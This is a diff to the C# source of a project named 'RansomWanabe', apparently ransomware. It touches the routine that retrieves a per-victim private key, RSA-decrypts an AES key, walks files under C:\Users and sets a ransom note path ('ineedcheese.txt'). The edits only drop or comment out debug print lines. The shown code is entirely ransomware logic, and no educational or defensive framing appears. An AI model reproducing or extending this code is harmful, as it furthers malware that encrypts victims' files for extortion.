@@ -312,7 +312,6 @@ namespace RansomWanabe
 
             //var publicKey = GetKey.GetPublicKey();
             var baseDir = $@"C:\Users";
-            Console.WriteLine(baseDir);
 
             //var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
@@ -327,7 +326,6 @@ namespace RansomWanabe
                     try
                     {
                         
-
                         var privateKey = GetKey.GetPrivateKey(uid);
 
                         byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(uid), privateKey);
@@ -344,7 +342,7 @@ namespace RansomWanabe
                         {
                             foreach (var file in dir)
                             {
-                                Console.WriteLine(file);
+                                //Console.WriteLine(file);
                                 var decryptedFile = Path.GetFileNameWithoutExtension(file);
                                 var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
                                 var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
